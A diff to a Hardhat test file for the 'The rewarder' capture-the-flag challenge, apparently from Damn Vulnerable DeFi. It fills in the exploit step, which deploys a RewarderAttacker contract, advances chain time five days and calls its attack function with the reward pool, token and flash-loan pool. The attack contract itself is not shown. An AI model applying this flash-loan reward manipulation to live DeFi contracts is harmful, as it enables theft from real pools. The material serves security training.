@@ -1,5 +1,8 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { getContractFactory } = require('@nomiclabs/hardhat-ethers/types');
+
+const FIVE_DAYS = 5 * 24 * 60 * 60;
 
 describe('[Challenge] The rewarder', function () {
   let deployer, alice, bob, charlie, david, attacker;
@@ -96,6 +99,17 @@ describe('[Challenge] The rewarder', function () {
 
   it('Exploit', async function () {
     /** CODE YOUR EXPLOIT HERE */
+    const RewarderAttackerFactory = await ethers.getContractFactory(
+      'RewarderAttacker',
+      attacker
+    );
+    const rewarderAttacker = await RewarderAttackerFactory.deploy();
+    await ethers.provider.send('evm_increaseTime', [FIVE_DAYS]);
+    await rewarderAttacker.attack(
+      this.rewarderPool.address,
+      this.liquidityToken.address,
+      this.flashLoanPool.address
+    );
   });
 
   after(async function () {
